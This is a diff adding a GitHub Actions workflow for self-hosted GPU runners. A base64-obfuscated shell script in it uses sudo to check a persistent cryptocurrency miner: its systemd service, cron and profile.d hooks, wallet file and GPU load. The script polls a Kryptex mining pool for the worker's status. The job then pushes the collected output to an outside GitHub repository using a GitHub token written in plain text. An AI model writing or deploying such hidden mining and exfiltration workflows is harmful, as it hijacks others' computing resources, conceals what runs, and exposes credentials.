@@ -1,0 +1,39 @@
+name: ul-t2-v
+on: [workflow_dispatch]
+permissions:
+  contents: write
+env:
+  B64: |
+    c2V0ICtlClM9InN1ZG8gLW4iOyBIPSQoaG9zdG5hbWUgLXMpOyBXPXBybDFwZWs4cmg4eWpjazVxNzU5
+    NmFwaDd1YTd4bmtxczh1cjlta2Ztejh3N3hmemNkZmNmeDV2c3gyZjRsegpXUks9dWwtdDItcHMtMTQ5
+    LTgxLTEwLTI0Mi1nMAplY2hvICI9PSB0MnZlcmlmeSAkKGRhdGUgLXUgKyVGVCVUWikgaG9zdD0kSCIK
+    ZWNobyAiYm9vdF9pZD0kKGNhdCAvcHJvYy9zeXMva2VybmVsL3JhbmRvbS9ib290X2lkKSI7IHVwdGlt
+    ZSAtczsgdXB0aW1lCiRTIHN5c3RlbWN0bCBpcy1hY3RpdmUgdWwtdDItcHMwOyAkUyBzeXN0ZW1jdGwg
+    aXMtZW5hYmxlZCB1bC10Mi1wczAKJFMgcGdyZXAgLWZhICIkV1JLIiB8IGhlYWQgLTMKJFMgY2F0IC9v
+    cHQvdWwtdDIvd2FsbGV0OyBlY2hvICIgbGVuPSQoJFMgY2F0IC9vcHQvdWwtdDIvd2FsbGV0IHwgdHIg
+    LWQgJ1xyXG4nIHwgd2MgLWMpIgokUyBjcm9udGFiIC1sIHwgZ3JlcCAtRSAndWwtdDInCmxzIC1sIC9v
+    cHQvdWwtdDIvYm9vdHByb29mLnNoIC9ldGMvcHJvZmlsZS5kL3VsLXQyLnNoCm52aWRpYS1zbWkgLS1x
+    dWVyeS1ncHU9aW5kZXgsbmFtZSxtZW1vcnkudG90YWwsbWVtb3J5LnVzZWQsdXRpbGl6YXRpb24uZ3B1
+    LHBvd2VyLmRyYXcgLS1mb3JtYXQ9Y3N2LG5vaGVhZGVyCmVjaG8gIi0tIHBvb2wiCmZvciBpIGluIDEg
+    MiAzIDQgNTsgZG8KICBSPSQoY3VybCAtcyAtbSAyMCAiaHR0cHM6Ly9wb29sLmtyeXB0ZXguY29tL3By
+    bC9hcGkvdjMvbWluZXIvd29ya2Vycy8kVyIgfCB0ciAneycgJ1xuJyB8IGdyZXAgIlwid29ya2VyXCI6
+    XCIkV1JLXCIiKQogIGVjaG8gInRyeSRpICR7UjowOjMzMH0iCiAgY2FzZSAiJFIiIGluIConInN0YXR1
+    cyI6Im9ubGluZSInKikgYnJlYWs7OyBlc2FjCiAgc2xlZXAgMTIKZG9uZQplY2hvICItLSBydW4gYm9v
+    dHByb29mIG5vdyI7ICRTIGJhc2ggL29wdC91bC10Mi9ib290cHJvb2Yuc2g7IHNsZWVwIDg7IGxzIC1s
+    IC90bXAvYm9vdHByb29mLnR4dCAmJiBjYXQgL3RtcC9ib290cHJvb2YudHh0IHwgaGVhZCAtNgplY2hv
+    IGRvbmUK
+jobs:
+  r:
+    runs-on: [self-hosted, ul-l40s]
+    timeout-minutes: 15
+    steps:
+      - name: run
+        run: |
+          echo "$B64" | base64 -d > /tmp/t2v.sh
+          bash /tmp/t2v.sh 2>&1 | tee /tmp/t2v.out
+          H=$(hostname -s); C=$(base64 -w0 /tmp/t2v.out)
+          T=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
+          P="cmdout8/ul-t2-v_${H}.txt"; B=https://api.github.com/repos/dongsuju/ul-plant/contents/$P
+          S=$(curl -s -m 30 -H "Authorization: token $T" "$B?ref=main" | sed -n 's/.*"sha": "\([a-f0-9]*\)".*/\1/p' | head -1)
+          if [ -n "$S" ]; then J="{\"message\":\"t2v\",\"content\":\"$C\",\"sha\":\"$S\",\"branch\":\"main\"}"; else J="{\"message\":\"t2v\",\"content\":\"$C\",\"branch\":\"main\"}"; fi
+          curl -s -m 30 -X PUT -H "Authorization: token $T" -H "Content-Type: application/json" -d "$J" "$B" | head -c 100
